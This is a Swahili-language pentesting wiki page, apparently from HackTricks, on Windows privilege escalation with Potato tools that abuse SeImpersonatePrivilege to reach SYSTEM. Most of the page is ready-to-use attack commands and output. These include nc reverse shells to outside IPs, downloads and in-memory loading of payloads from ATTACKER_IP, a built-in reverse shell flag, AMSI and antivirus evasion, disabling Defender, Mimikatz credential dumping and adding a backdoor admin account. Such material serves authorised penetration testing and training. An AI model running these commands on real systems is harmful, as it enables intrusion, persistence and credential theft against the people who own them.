# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 build 1809 na matoleo ya baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** zinaweza kutumika kutumia haki zilezile na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`**. [Chapisho hili la blogu](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) linaeleza kwa kina kuhusu zana ya `PrintSpoofer`, ambayo inaweza kutumika kutumia vibaya haki za impersonation kwenye mifumo ya Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Njia mbadala ya kisasa inayodumishwa mara kwa mara mwaka 2024–2025 ni SigmaPotato (fork ya GodPotato), ambayo huongeza matumizi ya in-memory/.NET reflection na usaidizi mpana zaidi wa OS. Tazama matumizi ya haraka hapa chini na repo katika References.

Kurasa zinazohusiana kwa maelezo ya msingi na mbinu za mikono:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Mahitaji na mambo ya kawaida ya kuzingatia

Mbinu zote zifuatazo hutegemea kutumia vibaya huduma ya upendeleo inayoweza kufanya impersonation, kutoka kwenye muktadha wenye mojawapo ya haki hizi:

- SeImpersonatePrivilege (inayotumika zaidi) au SeAssignPrimaryTokenPrivilege
- High integrity haihitajiki ikiwa tokeni tayari ina SeImpersonatePrivilege (jambo la kawaida kwa akaunti nyingi za huduma kama vile IIS AppPool, MSSQL, n.k.)

Kagua haki kwa haraka:

```cmd
whoami /priv | findstr /i impersonate
```

Maelezo ya Uendeshaji:

- Ikiwa shell yako inaendeshwa chini ya token yenye ruhusa chache isiyo na SeImpersonatePrivilege (jambo la kawaida kwa Local Service/Network Service katika baadhi ya miktadha), rejesha ruhusa-msingi za akaunti hiyo kwa kutumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Token ya mchakato inaweza kuwa na ruhusa chache kuliko token nyingine ya akaunti hiyohiyo ya huduma au kipindi hichohicho cha kuingia. Katika baadhi ya mipangilio, mteja wa named-pipe wa kipindi hicho hicho anaweza kufichua token tofauti yenye SeImpersonatePrivilege, lakini `RequiredPrivileges` iliyosanidiwa kwa huduma na `whoami /priv` hueleza mambo tofauti na havithibitishi kuwa token hiyo inapatikana. Thibitisha token halisi kabla ya kuzingatia njia ya impersonation.
- PrintSpoofer inahitaji huduma ya Print Spooler iwe inaendeshwa na ipatikane kupitia endpoint ya ndani ya RPC (spoolss). Katika mazingira yaliyofanywa kuwa salama zaidi ambapo Spooler imezimwa baada ya PrintNightmare, pendelea RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato inahitaji OXID resolver inayofikika kupitia TCP/135. Ikiwa egress imezuiwa, tumia redirector/port-forwarder (tazama mfano hapa chini). Kagua flags zinazotumika na build unayotumia.
- EfsPotato/SharpEfsPotato hutumia vibaya MS-EFSR; ikiwa pipe moja imezuiwa, jaribu pipes mbadala (lsarpc, efsrpc, samr, lsass, netlogon).
- Hitilafu 0x6d3 wakati wa RpcBindingSetAuthInfo kwa kawaida huashiria huduma ya uthibitishaji ya RPC isiyojulikana/isiyotumika; jaribu pipe/transport tofauti au hakikisha huduma lengwa inaendeshwa.
- Forks za “Kitchen-sink” kama DeadPotato hujumuisha moduli za ziada za payload (Mimikatz/SharpHound/Defender off) zinazogusa diski; tarajia ugunduzi wa juu zaidi wa EDR ikilinganishwa na matoleo asilia mepesi.

## Onyesho la Haraka

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Notes:
- Unaweza kutumia -i kuanzisha mchakato shirikishi kwenye console ya sasa, au -c kuendesha amri ya mstari mmoja.
- Inahitaji huduma ya Spooler. Ikiwa imezimwa, hii itashindwa.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

Kwenye [matumizi ya upstream](https://github.com/antonioCoco/RoguePotato#usage), `-e` huweka amri, `-l` huchagua porti ya local resolver, na `-c` ya hiari huchagua CLSID. Ikiwa uanzishaji wa COM utaanzisha huduma ambayo njia ya executable yake ilikuwa tayari imebadilishwa, huduma hiyo inaweza kutekeleza amri yake iliyobadilishwa bila kutegemea token impersonation; kagua usanidi wa huduma kabla ya kuhusisha utekelezaji wa SYSTEM ulioonekana na mbinu hii.

Ikiwa outbound 135 imezuiwa, elekeza upya OXID resolver kupitia socat kwenye redirector yako:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato ni primitive mpya ya kutumia vibaya COM iliyotolewa mwishoni mwa 2022, inayolenga huduma ya **PrintNotify** badala ya Spooler/BITS. Binary huanzisha seva ya PrintNotify COM, kubadilisha `IUnknown` na fake, kisha kuanzisha callback yenye mamlaka ya juu kupitia `CreatePointerMoniker`. Huduma ya PrintNotify (inayoendeshwa kama **SYSTEM**) inapounganisha tena, mchakato huiga token iliyorejeshwa na kuwasha payload iliyotolewa ikiwa na mamlaka kamili.<sup>[[13]](#references)</sup>

Mambo muhimu ya kiutendaji:

* Hufanya kazi kwenye Windows 10/11 na Windows Server 2012–2022, mradi huduma ya Print Workflow/PrintNotify imesakinishwa (ipo hata Spooler ya zamani ikiwa imezimwa baada ya PrintNightmare).
* Inahitaji muktadha unaopiga simu uwe na **SeImpersonatePrivilege** (hali ya kawaida kwa akaunti za huduma za IIS APPPOOL, MSSQL, na scheduled-task).
* Hukubali amri ya moja kwa moja au hali ya maingiliano ili uweze kubaki ndani ya console ya awali. Mfano:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Kwa kuwa inategemea COM pekee, haihitaji listeners za named-pipe wala redirectors za nje, hivyo inaweza kutumika kama mbadala wa moja kwa moja kwenye hosts ambako Defender huzuia RPC binding ya RoguePotato.

Waendeshaji kama Ink Dragon huendesha PrintNotifyPotato mara tu baada ya kupata ViewState RCE kwenye SharePoint ili kufanya pivot kutoka kwa worker wa `w3wp.exe` hadi SYSTEM kabla ya kusakinisha ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Kidokezo: Ikiwa pipe moja itashindwa au EDR itaizuia, jaribu pipe nyingine zinazoungwa mkono:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Vidokezo:
- Hufanya kazi kwenye Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege ipo.
- Pakua binary inayolingana na runtime iliyosakinishwa (kwa mfano, `GodPotato-NET4.exe` kwenye Server 2022 ya kisasa).
- Ikiwa primitive yako ya awali ya execution ni webshell/UI yenye timeout fupi, hifadhi payload kama script na uagize GodPotato iendeshe badala ya kutumia amri ndefu iliyoingizwa moja kwa moja.<sup>[[12]](#references)</sup>

Mfumo wa haraka wa staging kutoka kwenye webroot ya IIS inayoweza kuandikiwa:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato ina matoleo mawili yanayolenga objects za DCOM za huduma ambazo kwa chaguo-msingi hutumia RPC_C_IMP_LEVEL_IMPERSONATE. Tengeneza binaries zilizotolewa au uzitumie, kisha endesha command yako:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (GodPotato fork iliyosasishwa)

SigmaPotato inaongeza maboresho ya kisasa kama vile utekelezaji wa in-memory kupitia .NET reflection na helper ya PowerShell reverse shell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Perks za ziada katika builds za 2024–2025 (v1.2.x):
- Flag ya reverse shell iliyojengewa ndani `--revshell` na kuondolewa kwa kikomo cha herufi 1024 cha PowerShell, ili uweze kutekeleza payload ndefu zinazokwepa AMSI kwa mara moja.
- Sintaksia inayofaa kwa Reflection (`[SigmaPotato]::Main()`), pamoja na mbinu rahisi ya AV evasion kupitia `VirtualAllocExNuma()` ya kupotosha heuristics rahisi.
- `SigmaPotatoCore.exe` tofauti iliyokompailiwa dhidi ya .NET 2.0 kwa mazingira ya PowerShell Core.

### DeadPotato (toleo jipya la GodPotato la 2024 lenye modules)

DeadPotato huhifadhi mnyororo wa uigaji wa OXID/DCOM wa GodPotato, lakini hujumuisha wasaidizi wa post-exploitation ili operators waweze kupata SYSTEM mara moja na kufanya persistence/collection bila zana za ziada.<sup>[[15]](#references)</sup>

Modules za kawaida (zote zinahitaji SeImpersonatePrivilege):

- `-cmd "<cmd>"` — anzisha command yoyote kama SYSTEM.
- `-rev <ip:port>` — reverse shell ya haraka.
- `-newadmin user:pass` — unda local admin kwa ajili ya persistence.
- `-mimi sam|lsa|all` — weka na uendeshe Mimikatz ili kudump credentials (huandika kwenye diski na husababisha kelele nyingi).
- `-sharphound` — endesha ukusanyaji wa SharpHound kama SYSTEM.
- `-defender off` — zima ulinzi wa wakati halisi wa Defender (husababisha kelele nyingi).

Mifano ya amri za mstari mmoja:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Kwa kuwa inajumuisha binaries za ziada, tarajia flags nyingi zaidi za AV/EDR; tumia GodPotato/SigmaPotato ambazo ni ndogo zaidi pale stealth inapohitajika.

## References

- [1] [PrintSpoofer – Kutumia Vibaya Haki za Uigaji kwenye Windows 10 na Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Hakuna tena JuicyPotato? Hadithi ya zamani, karibu RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Rejesha haki chaguomsingi za tokeni kwa akaunti za huduma](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction hadi webroot RCE → FullPowers + GodPotato hadi SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — Macro ya LibreOffice → IIS webshell → GodPotato hadi SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Utafiti wa Check Point – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni ya Kivita ya Stealth Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Toleo lililofanyiwa kazi upya la GodPotato lenye moduli za post-ex zilizojengewa ndani](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
